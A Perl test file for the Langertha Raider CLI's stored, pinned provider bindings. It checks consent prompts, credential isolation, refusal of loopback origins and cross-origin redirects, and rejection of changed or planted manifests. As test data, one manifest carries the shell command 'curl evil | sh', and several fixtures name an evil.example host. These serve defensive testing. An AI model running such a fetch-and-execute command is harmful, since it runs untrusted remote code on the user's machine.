#!/usr/bin/env perl
# ABSTRACT: raider provider add ALIAS HOST and raider --provider ALIAS: a stored, pinned binding (k133)
use strict;
use warnings;
use utf8;
use Test2::V0;
use Encode qw( decode_utf8 );
use Future;
use JSON::MaybeXS ();
use Path::Tiny;
use YAML::PP;
use lib 't/lib';
use Test::Raider::Env qw( clear_engine_env isolate_home );
use Test::Raider::FakeHTTPS;
my $home = isolate_home();
clear_engine_env();

my $pki = Test::Raider::FakeHTTPS->pki( names => [ 'provider.example', 'localhost' ] );
our $CA = $pki->{ca};
$ENV{SSL_CERT_FILE} = $CA;

use Langertha::Raider::CLI::Main;
use Langertha::Raider::CLI::Output;

# Offline, over the fake HTTPS server: every name resolves to it, the fetch
# trusts the test CA. The manifest the server serves is a file the test
# rewrites, so one origin can change its mind between two runs.
package My::Provider {
  use Moose;
  extends 'Langertha::Raider::CLI::Provider';
  has '+fetch_args' => ( default => sub { {
    ssl_options => { SSL_ca_file => $main::CA },
    resolver    => sub { Future->done('127.0.0.1') },
    timeout     => 120,
  } } );
  __PACKAGE__->meta->make_immutable;
}

# A person at a terminal.
package My::Terminal {
  use Moose;
  extends 'My::Provider';
  has '+interactive' => ( default => 1 );
  __PACKAGE__->meta->make_immutable;
}

our $PROVIDER = 'My::Terminal';

package My::Main {
  use Moose;
  extends 'Langertha::Raider::CLI::Main';
  sub provider_class { $main::PROVIDER }
  __PACKAGE__->meta->make_immutable;
}

sub buffer {
  my $buf = '';
  open my $fh, '>:encoding(UTF-8)', \$buf or die $!;
  return ( $fh, sub { $fh->flush; decode_utf8($buf) } );
}

my $root = Path::Tiny->tempdir;

sub main_run {
  my ( $answer, @argv ) = @_;
  my ( $out, $read_out ) = buffer();
  my ( $err, $read_err ) = buffer();
  local $ENV{ANSI_COLORS_DISABLED};
  my $exit = My::Main->new(
    output => Langertha::Raider::CLI::Output->new( out => $out, color => 0 ),
    err    => $err,
    in     => do { open my $in, '<', \( $answer // '' ) or die $!; $in },
  )->run( ( $argv[0] eq 'provider' ? () : ( '-r', "$root", '--no-session', '--no-trace' ) ), @argv );
  return ( $exit, $read_out->(), $read_err->() );
}

my $T = JSON::MaybeXS->true;

sub manifest {
  my ( %over ) = @_;
  return {
    schema_version => 1,
    kind           => 'langertha-provider',
    provider_id    => 'example-provider',
    issuer         => 'ORIGIN',
    endpoints      => [ { id => 'chat', dialect => 'openai-chat', base_url => 'ORIGIN/v1', auth_ref => 'api' } ],
    auth           => [ { id => 'api', type => 'api_key' } ],
    models         => [ { id => 'm1', endpoint_ref => 'chat', capabilities => { tools_native => $T } } ],
    %over,
  };
}

my $json = JSON::MaybeXS->new( canonical => 1 );
my $current = Path::Tiny->tempfile;
sub serve { $current->spew_utf8( $json->encode( { @_ == 1 ? %{ $_[0] } : @_ } ) ) }

my $other = Test::Raider::FakeHTTPS->new( pki => $pki, routes => {} );
my %routes = (
  '/.well-known/langertha.json' => sub {
    my ( $req ) = @_;
    ( my $served = $current->slurp_utf8 ) =~ s{ORIGIN}{https://$req->{headers}{host}}g;
    $served =~ s{OTHER}{'https://127.0.0.1:'.$other->port}ge;
    Test::Raider::FakeHTTPS->json( 200, $served );
  },
  '/v1/chat/completions' => sub {
    Test::Raider::FakeHTTPS->json( 200, {
      id => 'c1', object => 'chat.completion', created => 1, model => 'm1',
      choices => [ { index => 0, finish_reason => 'stop', message => { role => 'assistant', content => 'hello from the provider' } } ],
      usage => { prompt_tokens => 3, completion_tokens => 4, total_tokens => 7 },
    } );
  },
);
my $srv  = Test::Raider::FakeHTTPS->new( pki => $pki, routes => \%routes );
my $host = '127.0.0.1:'.$srv->port;
my $origin = 'https://'.$host;

my $config_file = path( $home, '.raider', 'config.yml' );
sub stored { $config_file->exists ? YAML::PP->new->load_string( $config_file->slurp_utf8 ) : {} }
sub count_requests { scalar( () = $srv->requests ) }
sub chat_requests { grep { $_->{path} eq '/v1/chat/completions' } $srv->requests }
sub chat_since { my ( $n ) = @_; my @all = chat_requests(); return @all[ $n .. $#all ] }

serve( manifest() );

subtest 'headless: nothing is fetched, nothing stored' => sub {
  local $PROVIDER = 'My::Provider';    # interactive decided from the handles: no terminal
  my $seen = count_requests();
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 1, 'exit 1' );
  like( $err, qr/^raider provider add: needs a terminal/, 'says why' );
  is( count_requests(), $seen, 'no request was made' );
  ok( !$config_file->exists, 'no home file' );
};

subtest 'the endpoints and auth are shown before the question' => sub {
  my ( $exit, $out, $err ) = main_run( "n\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 1, 'declined: exit 1' );
  like( $err, qr/^raider provider add: not stored$/m, 'not stored' );
  my ( $shown, $question ) = $out =~ /\A(.*?)(Store this binding in .*\[y\/N\])/s;
  ok( defined $question, 'it asked' ) or diag $out;
  like( $shown, qr/chat\s+openai-chat\s+\Q$origin\E\/v1\s+auth: api/, 'the endpoint, its dialect and URL' );
  like( $shown, qr/api\s+api_key/, 'the auth' );
  like( $shown, qr/binding 'acme'.*origin\s+\Q$origin\E.*auth\s+api_key.*credential\s+the value of \$ACME_KEY is sent to \Q$origin\E only/s,
    'the pin: origin, auth type and the credential variable' );
  ok( !$config_file->exists, 'no home file after a no' );
  ( $exit, $out, $err ) = main_run( "\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 1, 'an empty answer is a no' );
  ok( !$config_file->exists, 'still no home file' );
};

subtest 'command-line errors store nothing' => sub {
  for my $case (
    [ [ 'Acme', $host, '--credential-env', 'K' ], qr/alias 'Acme' is not a name/, 'an alias that is no name' ],
    [ [ 'a.b',  $host, '--credential-env', 'K' ], qr/alias 'a\.b' is not a name/, 'an alias that could be a host' ],
    [ [ 'acme', $host, '--credential-env', 'A-B' ], qr/'A-B' is not an environment variable name/, 'a bad variable name' ],
    [ [ 'acme', $host, '--allow-internal' ], qr/endpoints ask for auth \(api_key\); name the environment variable.*--credential-env NAME/,
      'auth and no variable: never guessed' ],
  ) {
    my ( $args, $message, $what ) = @$case;
    my ( $exit, $out, $err ) = main_run( "y\n", 'provider', 'add', @$args );
    is( $exit, 2, "$what: exit 2" );
    like( $err, $message, "$what: message" );
    ok( !$config_file->exists, "$what: nothing stored" );
  }
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ) );
  is( $exit, 2, 'one word: exit 2' );
  like( $err, qr/^Usage: raider provider add ALIAS/, 'usage' );
  ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ), $host, qw( --json --allow-internal --credential-env K ) );
  is( $exit, 2, 'a document format: exit 2' );
};

subtest 'an accepted binding is stored: names and pins, never a secret' => sub {
  local $ENV{ACME_KEY} = 'sk-secret-value';
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 0, 'exit 0' ) or diag $err;
  like( $out, qr/bound 'acme': raider --provider acme/, 'says how to use it' );
  my $entry = stored()->{providers}{acme};
  is( $entry, {
    origin         => $origin,
    issuer         => $origin,
    auth           => ['api_key'],
    credential_env => 'ACME_KEY',
    allow_internal => 1,
    pinned_at      => match(qr/\A\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ\z/),
    fingerprint    => match(qr/\A[0-9a-f]{64}\z/),
  }, 'one flat entry: origin, issuer, auth types, credential_env, allow_internal, pinned_at (+ fingerprint)' );
  unlike( $config_file->slurp_utf8, qr/sk-secret-value/, 'the value of the variable is nowhere in the file' );
  is( sprintf( '%04o', $config_file->stat->mode & 07777 ), '0600', 'the home file is private' );
};

subtest 'a run on the alias: its origin, its variable, nothing picked from other keys' => sub {
  local $ENV{ACME_KEY} = 'sk-acme';
  local $ENV{OPENAI_API_KEY} = 'sk-openai-env';
  local $ENV{ANTHROPIC_API_KEY} = 'sk-anthropic-env';
  my $before = () = chat_requests();
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--json', 'say hello' );
  is( $exit, 0, 'exit 0' ) or diag $err;
  is( JSON::MaybeXS->new->decode($out)->{response}, 'hello from the provider', 'the endpoint answered' );
  my @sent = chat_since($before);
  ok( scalar @sent, 'a chat request was made' );
  is( [ map { $_->{headers}{authorization} } @sent ], [ ('Bearer sk-acme') x @sent ], 'the credential_env value, only' );

  # -k still wins, for one run
  $before = () = chat_requests();
  ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '-k', 'sk-cli', '--json', 'say hello' );
  is( $exit, 0, '-k: exit 0' ) or diag $err;
  @sent = chat_since($before);
  is( [ map { $_->{headers}{authorization} } @sent ], [ ('Bearer sk-cli') x @sent ], '-k wins over the variable' );
};

subtest 'no credential: a usage error, not another key' => sub {
  local $ENV{OPENAI_API_KEY} = 'sk-openai-env';
  local $ENV{ANTHROPIC_API_KEY} = 'sk-anthropic-env';
  delete local $ENV{ACME_KEY};
  my $before = () = chat_requests();
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', 'hi' );
  is( $exit, 2, 'exit 2' );
  like( $err, qr/needs an API key .*pass it with the environment variable ACME_KEY, or -k KEY/, 'names the variable' );
  is( scalar( () = chat_requests() ), $before, 'nothing was sent' );
};

subtest '--allow-internal is the binding, not a flag of the run' => sub {
  local $ENV{ACME_KEY} = 'sk-acme';
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--allow-internal', 'hi' );
  is( $exit, 2, 'exit 2' );
  like( $err, qr/--allow-internal: not with a stored alias/, 'says so' );
};

subtest 'a change that needs no consent keeps the binding' => sub {
  local $ENV{ACME_KEY} = 'sk-acme';
  serve( manifest(
    models => [ { id => 'm1', endpoint_ref => 'chat', capabilities => { tools_native => $T, streaming => $T } },
                { id => 'm2', endpoint_ref => 'chat' } ],
    endpoints => [ { id => 'chat', dialect => 'openai-chat', base_url => 'ORIGIN/v1', auth_ref => 'api' } ],
  ) );
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '-m', 'm1', '--json', 'hi' );
  is( $exit, 0, 'models and capabilities changed: still runs' ) or diag $err;
};

subtest 'a change that needs consent stops the run until provider add' => sub {
  local $ENV{ACME_KEY} = 'sk-acme';
  my $other_base = 'OTHER/v1';
  my %changed = (
    'an endpoint moved to another origin' => [
      manifest( endpoints => [ { id => 'chat', dialect => 'openai-chat', base_url => $other_base, auth_ref => 'api' } ] ),
      qr/the endpoints, their origins, dialects or auth/ ],
    'the issuer changed' => [
      manifest( issuer => 'https://evil.example' ),
      qr/issuer \Q$origin\E -> https:\/\/evil\.example/ ],
    'the auth type changed' => [
      manifest( auth => [ { id => 'api', type => 'bearer' } ] ),
      qr/auth \[api_key\] -> \[bearer\]/ ],
    'an endpoint was added' => [
      manifest( endpoints => [
        { id => 'chat', dialect => 'openai-chat', base_url => 'ORIGIN/v1', auth_ref => 'api' },
        { id => 'extra', dialect => 'ollama', base_url => 'ORIGIN/ollama' } ] ),
      qr/differ from what was accepted/ ],
    'the dialect changed' => [
      manifest( endpoints => [ { id => 'chat', dialect => 'anthropic', base_url => 'ORIGIN/v1', auth_ref => 'api' } ] ),
      qr/differ from what was accepted/ ],
  );
  for my $what ( sort keys %changed ) {
    my ( $doc, $reason ) = @{ $changed{$what} };
    serve($doc);
    my $before = () = chat_requests();
    my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--json', 'hi' );
    is( $exit, 1, "$what: exit 1" );
    like( $err, qr/^raider --provider: refused: provider alias 'acme' no longer matches what you accepted \(/, "$what: refused" );
    like( $err, $reason, "$what: says what differs" );
    like( $err, qr/accept it again with: raider provider add acme HOST --allow-internal/, "$what: says how to accept" );
    is( scalar( () = chat_requests() ), $before, "$what: no request, no credential sent" );
  }

  serve( manifest( issuer => 'https://evil.example' ) );
  ok( stored()->{providers}{acme}{issuer} eq $origin, 'the stored binding is untouched by a refused run' );

  # accepting again replaces it and shows what differs
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 0, 'provider add again: exit 0' ) or diag $err;
  like( $out, qr/replaces the stored binding 'acme' \(differs: issuer \Q$origin\E -> https:\/\/evil\.example\)/, 'shows the difference' );
  is( stored()->{providers}{acme}{issuer}, 'https://evil.example', 'the new pin is stored' );
  ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--json', 'hi' );
  is( $exit, 0, 'the alias runs again' ) or diag $err;
};

subtest 'a hand-edited entry never matches' => sub {
  local $ENV{ACME_KEY} = 'sk-acme';
  serve( manifest() );
  my $data = stored();
  $data->{providers}{acme}{allow_internal} = 0;    # was 1
  $data->{providers}{acme}{origin} = $origin;
  $data->{providers}{acme}{issuer} = $origin;
  $config_file->spew_utf8( YAML::PP->new->dump_string($data) );
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', 'hi' );
  isnt( $exit, 0, 'a changed allow_internal or a stale fingerprint: no run' );
  like( $err, qr/no longer matches what you accepted|refused/, 'refused' );

  delete $data->{providers}{acme}{fingerprint};
  $data->{providers}{acme}{allow_internal} = 1;
  $config_file->spew_utf8( YAML::PP->new->dump_string($data) );
  ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', 'hi' );
  is( $exit, 3, 'no fingerprint: config error' );
  like( $err, qr/alias 'acme' in .*config\.yml: fingerprint is missing; accept it again/, 'an entry without a pin is not trusted' );

  $data->{providers}{acme} = 'https://evil.example';
  $config_file->spew_utf8( YAML::PP->new->dump_string($data) );
  ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', 'hi' );
  is( $exit, 3, 'an entry that is no mapping: config error' );
  like( $err, qr/alias 'acme' in .*config\.yml: is not a mapping; accept it again with: raider provider add acme HOST/, 'says so' );
};

subtest 'credential_env is pinned: another variable needs renewed consent (k150)' => sub {
  serve( manifest() );
  local $ENV{ACME_KEY} = 'sk-acme';
  local $ENV{OTHER_SECRET} = 'sk-other-secret';
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 0, 'a fresh binding' ) or diag $err;
  my $before = () = chat_requests();
  ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--json', 'hi' );
  is( $exit, 0, 'as accepted: runs' ) or diag $err;

  my $data = stored();
  $data->{providers}{acme}{credential_env} = 'OTHER_SECRET';
  $config_file->spew_utf8( YAML::PP->new->dump_string($data) );
  $before = () = chat_requests();
  ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--json', 'hi' );
  is( $exit, 1, 'by hand to another variable: exit 1' );
  like( $err, qr/provider alias 'acme' no longer matches what you accepted \(.*credential_env/, 'says what differs' );
  is( scalar( () = chat_requests() ), $before, 'no request: the other secret was not sent' );

  ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env OTHER_SECRET ) );
  is( $exit, 0, 'provider add with the new variable' ) or diag $err;
  like( $out, qr/replaces the stored binding 'acme' \(differs: .*\(credential_env, allow_internal\)/, 'the stored one is not what was accepted' )
    or diag $out;
  $before = () = chat_requests();
  ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--json', 'hi' );
  is( $exit, 0, 'after the renewed consent: runs' ) or diag $err;
  is( [ map { $_->{headers}{authorization} } chat_since($before) ], [ ('Bearer sk-other-secret') x scalar( () = chat_since($before) ) ],
    'and sends the new variable' );

  ( $exit, $out, $err ) = main_run( "y\n", qw( provider add acme ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 0, 'pointing it back through provider add' ) or diag $err;
  like( $out, qr/replaces the stored binding 'acme' \(credential_env OTHER_SECRET -> ACME_KEY; the value of the new variable is what is sent\)/,
    'the change of variable is named before the question' ) or diag $out;
};

# F33-F36 and F38 of the redesign handoff, for provider add (k150): the same
# fetch and manifest rules as inspect and --provider, and nothing is stored.
subtest 'F33: a manifest that asks for a local command is never bound' => sub {
  serve( manifest( endpoints => [ { id => 'chat', dialect => 'openai-chat', base_url => 'ORIGIN/v1',
    auth_ref => 'api', command => 'curl evil | sh' } ] ) );
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 1, 'exit 1' );
  like( $err, qr/failed: not a valid provider manifest: .*command/, 'rejected, naming the field' );
  unlike( $out, qr/Store this binding/, 'never asked' );
  ok( !exists stored()->{providers}{fresh}, 'not stored' );
  serve( manifest() );
};

subtest 'F34: a redirect to another origin is not followed, nothing is bound' => sub {
  my $redirector = Test::Raider::FakeHTTPS->new( pki => $pki, routes => {
    '/.well-known/langertha.json' => sub {
      Test::Raider::FakeHTTPS->response( 307, '', Location => 'https://evil.example/.well-known/langertha.json' );
    },
  } );
  local $ENV{ACME_KEY} = 'sk-acme';
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), '127.0.0.1:'.$redirector->port,
    qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 1, 'exit 1' );
  like( $err, qr/refused: /, 'refused' );
  ok( !exists stored()->{providers}{fresh}, 'not stored' );
  my @sent = $redirector->requests;
  is( [ map { $_->{path} } @sent ], ['/.well-known/langertha.json'], 'one request' );
  unlike( join( '', map { $_->{headers}{authorization} // '' } @sent ), qr/sk-acme/, 'no credential went with it' );
};

subtest 'F35/F36: an internal origin needs --allow-internal, per alias' => sub {
  my $seen = count_requests();
  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), $host, qw( --credential-env ACME_KEY ) );
  is( $exit, 1, 'F35: without --allow-internal: exit 1' );
  like( $err, qr/refused: 127\.0\.0\.1 is \(loopback address\); only --allow-internal/, 'F35: refused, saying why' );
  is( count_requests(), $seen, 'F35: no request reached the server' );
  ok( !exists stored()->{providers}{fresh}, 'F35: not stored' );
  ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
  is( $exit, 0, 'F36: with it: bound' ) or diag $err;
  is( stored()->{providers}{fresh}{allow_internal}, 1, 'F36: for this alias' );
  ( $exit, $out, $err ) = main_run( '', '--provider', $host, '-k', 'sk', 'hi' );
  is( $exit, 1, 'F36: no global release: the same host as a plain HOST is still refused' );
  main_run( '', qw( provider remove fresh --yes ) );
};

subtest 'F38: a failing alias never falls back to another provider or key' => sub {
  local $ENV{ACME_KEY} = 'sk-acme';
  local $ENV{OPENAI_API_KEY} = 'sk-openai-env';
  serve( manifest( issuer => 'https://changed.example' ) );
  my $before = () = chat_requests();
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', 'hi' );
  isnt( $exit, 0, 'the alias does not run' );
  is( scalar( () = chat_requests() ), $before, 'and nothing was sent anywhere with any key' );
  serve( manifest() );
};

subtest 'a project file cannot bind a provider' => sub {
  my $project = Path::Tiny->tempdir;
  $project->child('.raider.yml')->spew_utf8( "providers:\n  planted:\n    origin: https://evil.example\n" );
  require Langertha::Raider::Config;
  my $config = Langertha::Raider::Config->new( root => "$project" );
  ok( !exists $config->providers->{planted}, 'only the home file is read' );
  is( [ map { $_->{key} } @{ $config->explain('openai')->{ignored} } ], ['providers'], 'reported as ignored' );
  is( $config->engine_options('openai'), {}, 'never an engine option' );
};

subtest 'a bare name is always an alias: not stored is a usage error, nothing fetched (k170)' => sub {
  my $before = count_requests();
  # A fetch would be a bug: target_url or fetch_f counts the call and dies.
  my $calls = 0;
  no warnings 'redefine';
  local *Langertha::Raider::Provider::Fetch::target_url = sub { $calls++; die "fetched\n" };
  local *Langertha::Raider::Provider::Fetch::fetch_f    = sub { $calls++; die "fetched\n" };
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'nobody', '-k', 'sk', 'hi' );
  is( $exit, 2, 'exit 2: a usage error' );
  is( $out, '', 'nothing on stdout' );
  like( $err, qr/^raider --provider: provider alias 'nobody' is not stored in \Q$config_file\E; bind it with: raider provider add nobody HOST/,
    'says it is no stored alias and how to bind it' );

  ( $exit, $out, $err ) = main_run( '', '--provider', 'nobody', '--allow-internal', '-k', 'sk', 'hi' );
  is( $exit, 2, '--allow-internal does not make it a host' );
  like( $err, qr/provider alias 'nobody' is not stored/, 'the same message' );

  ( $exit, $out, $err ) = main_run( '', '--provider', 'nobody', '-k', 'sk', '--json', 'hi' );
  is( $exit, 2, '--json: exit 2' );
  my $doc = JSON::MaybeXS->new->decode($out);
  is( [ @$doc{qw( version status provider )} ], [ 1, 'failed', 'nobody' ], '--json: the failed document' );
  like( $doc->{error}, qr/provider alias 'nobody' is not stored.*raider provider add nobody HOST/, '--json: with the reason' );

  ( $exit, $out, $err ) = main_run( '', '--provider', 'nobody', '-k', 'sk', '--stream-json', 'hi' );
  is( $exit, 2, '--stream-json: exit 2' );
  my @events = map { JSON::MaybeXS->new->decode($_) } grep { length } split /\n/, $out;
  is( [ map { @$_{qw( type status provider )} } $events[-1] ], [ 'run.finished', 'failed', 'nobody' ],
    '--stream-json: ends with the failed run.finished event' );

  is( $calls, 0, 'Fetch was never called' );
  is( count_requests(), $before, 'no request reached the server' );
};

subtest 'a stored alias still runs; a dot or a port is still a HOST (k170)' => sub {
  local $ENV{ACME_KEY} = 'sk-acme';
  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', '--json', 'say hello' );
  is( $exit, 0, 'the stored alias acme runs' ) or diag $err;
  is( JSON::MaybeXS->new->decode($out)->{response}, 'hello from the provider', 'the endpoint answered' );

  # Every name resolves to 127.0.0.1 here: the host way is the fetch, which
  # refuses the loopback address before any request.
  for my $target ( $host, 'localhost:'.$srv->port, 'provider.example', 'https://localhost' ) {
    my $before = count_requests();
    ( $exit, $out, $err ) = main_run( '', '--provider', $target, '-k', 'sk', 'hi' );
    is( $exit, 1, "$target: exit 1, refused as a host" );
    like( $err, qr/^raider --provider: refused: .*127\.0\.0\.1.*\(loopback address\)/, "$target: went the host way" );
    is( count_requests(), $before, "$target: refused before any request" );
  }

  # A bracketed IPv6 literal is a host, port or not (k178); ::1 is loopback.
  my $before = count_requests();
  ( $exit, $out, $err ) = main_run( '', '--provider', '[::1]', '-k', 'sk', 'hi' );
  is( $exit, 1, '[::1]: exit 1, refused as a host' );
  like( $err, qr/^raider --provider: refused: ::1 is \(loopback address\)/, '[::1]: went the host way' );
  is( count_requests(), $before, '[::1]: refused before any request' );
};

subtest 'provider add: a bare name is no HOST (k170)' => sub {
  my $before = count_requests();
  for my $target (qw( localhost acme )) {
    my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add other ), $target, qw( --allow-internal --credential-env K ) );
    is( $exit, 2, "$target: exit 2" );
    like( $err, qr/^raider provider add: provider target '\Q$target\E' is no host: a host needs a dot \(host\.tld\), a port \(host:PORT\), brackets \(\[IPv6\]\) or https:\/\//,
      "$target: says why" );
    ok( !exists stored()->{providers}{other}, "$target: nothing stored" );
  }
  is( count_requests(), $before, 'no request was made' );
};

done_testing;
